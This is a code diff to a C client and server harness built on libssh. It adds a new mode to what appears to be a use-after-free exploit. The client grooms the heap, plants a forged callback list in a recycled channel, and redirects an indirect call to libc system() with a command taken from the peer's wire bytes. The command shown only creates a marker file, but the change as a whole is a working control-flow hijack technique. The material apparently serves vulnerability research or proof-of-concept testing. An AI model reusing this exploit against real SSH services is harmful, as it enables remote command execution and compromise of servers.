@@ -53,6 +53,16 @@ static int g_inline = 0;
 static int g_wirelist = 0;
 static uint64_t g_wirelist_chunk = 0;
 #endif
+#ifdef W25_SYSWIRE
+/* W25: W24's wire-resident callback iterator plus W16's wire-resident command
+ * and a direct library call to libc system(). No app-owned callback trampoline
+ * or command string is on this lane's executed path: the callee and its first
+ * (command) argument come from the authenticated peer's wire bytes in the
+ * recycled channel. The literal below exists only so the client can put the
+ * chosen bytes on the wire; system() reads them from the recycled channel. */
+static int g_syswire = 0;
+static const char g_syswire_cmd[] = "touch evidence-wire-syswire.marker";
+#endif
 #ifdef W14_REALSYSTEM
 /* W14: the indirect call from channel_rcv_data() targets real libc system().
  * The callback's first argument is channel->session, read from the recycled
@@ -227,6 +237,17 @@ static int on_data(ssh_session s, ssh_channel ch, void *data, uint32_t len,
                     ((char *)g_groom_ptr + INLINE_CBS_OFF);
                 printf("SERVER wirelist it=%p next=%p data=%p\n",
                        (void *)it, (void *)it->next, it->data);
+                fflush(stdout);
+            }
+#endif
+#ifdef W25_SYSWIRE
+            if (g_syswire && it != NULL) {
+                uint64_t armed = 0, cmd = 0;
+                memcpy(&armed, (char *)g_groom_ptr + INLINE_CBS_OFF + 16,
+                       sizeof(armed));
+                memcpy(&cmd, g_groom_ptr, sizeof(cmd));
+                printf("SERVER SYSWIRE armed fn=0x%llx cmd=0x%llx\n",
+                       (unsigned long long)armed, (unsigned long long)cmd);
                 fflush(stdout);
             }
 #endif
@@ -503,6 +524,30 @@ static int run_client(void)
 #endif
 #endif
             memcpy(payload + 112, &fn, sizeof(fn));
+#ifdef W25_SYSWIRE
+            if (g_syswire) {
+                uint64_t sess = g_wirelist_chunk + WIRECMD_CMD_OFF;
+                uint64_t sz = 24;
+                uint64_t ud = sess;
+                uint64_t fn_sys = g_bad_call ? 0x4141414141414141ull :
+                                  (uint64_t)(uintptr_t)&system;
+                uint64_t cbs = g_wirelist_chunk + INLINE_CBS_OFF;
+                uint64_t nxt = 0;
+                memcpy(payload + WIRECMD_CMD_OFF, g_syswire_cmd,
+                       strlen(g_syswire_cmd) + 1);
+                memcpy(payload, &sess, sizeof(sess));
+                memcpy(payload + INLINE_CBS_OFF, &sz, sizeof(sz));
+                memcpy(payload + INLINE_CBS_OFF + 8, &ud, sizeof(ud));
+                memcpy(payload + INLINE_CBS_OFF + 16, &fn_sys, sizeof(fn_sys));
+                memcpy(payload + WIRELIST_IT_OFF, &nxt, sizeof(nxt));
+                memcpy(payload + WIRELIST_IT_OFF + 8, &cbs, sizeof(cbs));
+                memcpy(payload + 112, &fn_sys, sizeof(fn_sys));
+                printf("CLIENT syswire fn=0x%llx sess=0x%llx cmd=%s bad=%d\n",
+                       (unsigned long long)fn_sys, (unsigned long long)sess,
+                       g_syswire_cmd, g_bad_call);
+                fflush(stdout);
+            }
+#endif
             if (g_exec) {
 #ifdef W13_INLINE
             if (g_inline) {
@@ -592,6 +637,9 @@ int main(int argc, char **argv)
                 "usage: %s hostkey [data-only|no-free|groom|groom-survive|groom-call|groom-call-bad|groom-exec|groom-nodetach-exec|groom-nodetach-bare|groom-realsystem|groom-realsystem-bad]\n",
 #endif
                 argv[0]);
+#ifdef W25_SYSWIRE
+        fprintf(stderr, "W25 modes: %s hostkey groom-syswire CHUNK_ADDR|groom-syswire-bad CHUNK_ADDR\n", argv[0]);
+#endif
 #ifdef W24_WIRELIST
         fprintf(stderr, "W24 modes: %s hostkey groom-wirelist CHUNK_ADDR|groom-wirelist-bad CHUNK_ADDR\n", argv[0]);
 #endif
@@ -728,6 +776,23 @@ int main(int argc, char **argv)
         g_exec = 1;
         g_inline = 1;
         g_wirelist = 1;
+        g_bad_call = 1;
+#endif
+#ifdef W25_SYSWIRE
+    } else if (argc == 4 && strcmp(argv[2], "groom-syswire") == 0) {
+        g_groom = 1;
+        g_call = 1;
+        g_nodetach = 1;
+        g_inline = 1;
+        g_wirelist = 1;
+        g_syswire = 1;
+    } else if (argc == 4 && strcmp(argv[2], "groom-syswire-bad") == 0) {
+        g_groom = 1;
+        g_call = 1;
+        g_nodetach = 1;
+        g_inline = 1;
+        g_wirelist = 1;
+        g_syswire = 1;
         g_bad_call = 1;
 #endif
 #ifdef W12_FIXEDADDR
